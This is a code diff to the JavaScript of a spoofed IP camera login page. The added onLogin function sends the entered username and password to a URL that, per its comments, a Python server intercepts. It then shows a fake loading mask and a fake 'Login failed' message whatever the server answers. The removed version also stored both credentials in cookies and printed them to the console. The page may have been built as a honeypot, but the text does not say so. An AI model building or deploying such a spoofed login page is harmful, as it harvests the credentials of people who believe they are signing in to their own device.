@@ -1335,68 +1335,110 @@ function HidePaop() {
 	$("#MsgPaop").fadeOut("slow").slideUp("slow", function () { $(this).css("display", "none"); }).attr("name", "out");
 }
 
+// function onLogin() {
+//     //check userName format
+// 	var user = $("#username").val();
+// 	var passwd = $("#passwd").val();
+// 	document.cookie = "username=" + user;
+// 	document.cookie = "password=" + passwd;
+//     var webLoginResult = -100;
+//     var userAg = navigator.userAgent.toLowerCase();
+//     chromes = /chrome\/([\d.]+)/;
+//     var matchs = chromes.exec(userAg);
+
+//      if (user == "") {
+// 		 $("#MsgPaop").css("display", "block").slideDown("slow").attr("name", "in");
+// 		 $("#Paoptitle").html("<center><div style='font-weight:700;font-size:14px;padding-top:5px;'>" + 'Tips' + "</div></center>");
+// 		 $("#PaopContant").html('Please enter your user name');
+// 		 setTimeout(function () {
+// 			 $("#PaopBg").css("background-position", "0px -31px");
+// 			 setTimeout(function () {
+// 				 $("#PaopBg").css("background-position", "0px -62px");
+// 				 setTimeout(function () {
+// 					 $("#PaopBg").css("background-position", "0px 0px")
+// 				 }, 200);
+// 			 }, 200);
+// 		 }, 200);
+// 		 paopTimer = setTimeout(function () { HidePaop(); }, 5000);
+// 		 return;
+//     }
+
+// 	if (passwd == "") {
+// 		$("#MsgPaop").css("display", "block").slideDown("slow").attr("name", "in");
+// 		$("#Paoptitle").html("<center><div style='font-weight:700;font-size:14px;padding-top:5px;'>" + 'Tips' + "</div></center>");
+// 		$("#PaopContant").html('Username / password do not match');
+// 		setTimeout(function () {
+// 			$("#PaopBg").css("background-position", "0px -31px");
+// 			setTimeout(function () {
+// 				$("#PaopBg").css("background-position", "0px -62px");
+// 				setTimeout(function () {
+// 					$("#PaopBg").css("background-position", "0px 0px")
+// 				}, 200);
+// 			}, 200);
+// 		}, 200);
+// 		paopTimer = setTimeout(function () { HidePaop(); }, 5000);
+// 		return;
+// 	}
+
+// 	MasklayerShow();
+
+// 	$("#MsgPaop").css("display", "block").slideDown("slow").attr("name", "in");
+// 	$("#Paoptitle").html("<center><div style='font-weight:700;font-size:14px;padding-top:5px;'>" + 'Tips' + "</div></center>");
+// 	$("#PaopContant").html('Login failed. Reloading page');
+// 	setTimeout(function () {
+// 		$("#PaopBg").css("background-position", "0px -31px");
+// 		setTimeout(function () {
+// 			$("#PaopBg").css("background-position", "0px -62px");
+// 			setTimeout(function () {
+// 				$("#PaopBg").css("background-position", "0px 0px")
+// 			}, 200);
+// 		}, 200);
+// 	}, 200);
+// 	paopTimer = setTimeout(function () { HidePaop(); MasklayerHide(); location.reload()}, 5000);
+
+// 	console.log("Logged in with the following credentials: (" + user + ", " + passwd + ")");
+// }
+
 function onLogin() {
-    //check userName format
-	var user = $("#username").val();
-	var passwd = $("#passwd").val();
-	document.cookie = "username=" + user;
-	document.cookie = "password=" + passwd;
-    var webLoginResult = -100;
-    var userAg = navigator.userAgent.toLowerCase();
-    chromes = /chrome\/([\d.]+)/;
-    var matchs = chromes.exec(userAg);
+    var user = document.getElementById("username").value;
+    var passwd = document.getElementById("passwd").value;
 
-     if (user == "") {
-		 $("#MsgPaop").css("display", "block").slideDown("slow").attr("name", "in");
-		 $("#Paoptitle").html("<center><div style='font-weight:700;font-size:14px;padding-top:5px;'>" + 'Tips' + "</div></center>");
-		 $("#PaopContant").html('Please enter your user name');
-		 setTimeout(function () {
-			 $("#PaopBg").css("background-position", "0px -31px");
-			 setTimeout(function () {
-				 $("#PaopBg").css("background-position", "0px -62px");
-				 setTimeout(function () {
-					 $("#PaopBg").css("background-position", "0px 0px")
-				 }, 200);
-			 }, 200);
-		 }, 200);
-		 paopTimer = setTimeout(function () { HidePaop(); }, 5000);
-		 return;
-    }
+    console.log("Attempting to log in with User: " + user);
 
-	if (passwd == "") {
-		$("#MsgPaop").css("display", "block").slideDown("slow").attr("name", "in");
-		$("#Paoptitle").html("<center><div style='font-weight:700;font-size:14px;padding-top:5px;'>" + 'Tips' + "</div></center>");
-		$("#PaopContant").html('Username / password do not match');
-		setTimeout(function () {
-			$("#PaopBg").css("background-position", "0px -31px");
-			setTimeout(function () {
-				$("#PaopBg").css("background-position", "0px -62px");
-				setTimeout(function () {
-					$("#PaopBg").css("background-position", "0px 0px")
-				}, 200);
-			}, 200);
-		}, 200);
-		paopTimer = setTimeout(function () { HidePaop(); }, 5000);
-		return;
-	}
+    // Show a fake loading mask
+    MasklayerShow();
 
-	MasklayerShow();
+    // Construct the URL the real camera expects
+    var url = "/cgi-bin/CGIProxy.fcgi?cmd=login&usr=" + encodeURIComponent(user) + "&pwd=" + encodeURIComponent(passwd);
 
-	$("#MsgPaop").css("display", "block").slideDown("slow").attr("name", "in");
-	$("#Paoptitle").html("<center><div style='font-weight:700;font-size:14px;padding-top:5px;'>" + 'Tips' + "</div></center>");
-	$("#PaopContant").html('Login failed. Reloading page');
-	setTimeout(function () {
-		$("#PaopBg").css("background-position", "0px -31px");
-		setTimeout(function () {
-			$("#PaopBg").css("background-position", "0px -62px");
-			setTimeout(function () {
-				$("#PaopBg").css("background-position", "0px 0px")
-			}, 200);
-		}, 200);
-	}, 200);
-	paopTimer = setTimeout(function () { HidePaop(); MasklayerHide(); location.reload()}, 5000);
+    // Make the actual GET request. Your Python server will intercept this.
+    fetch(url)
+        .then(response => {
+            // We got a response from the Python proxy.
+            // You can check the response here if you want, but for a simple spoof,
+            // just show a generic message and reload.
+            console.log("Proxy responded. Simulating failure and reloading.");
 
-	console.log("Logged in with the following credentials: (" + user + ", " + passwd + ")");
+            // Show a fake error message
+            $("#MsgPaop").css("display", "block").slideDown("slow");
+            $("#Paoptitle").html("<center><div>Tips</div></center>");
+            $("#PaopContant").html('Login failed. Please check your credentials and try again.');
+
+            // Hide the message and reload after a few seconds
+            setTimeout(function () {
+                HidePaop();
+                MasklayerHide();
+                // Optionally, clear the password field
+                document.getElementById("passwd").value = "";
+                // location.reload(); // You might not even want to reload
+            }, 4000);
+        })
+        .catch(error => {
+            // Handle network errors if the fetch itself fails
+            console.error('Fetch Error:', error);
+            MasklayerHide();
+            alert("A network error occurred.");
+        });
 }
 
 function MasklayerShow() {
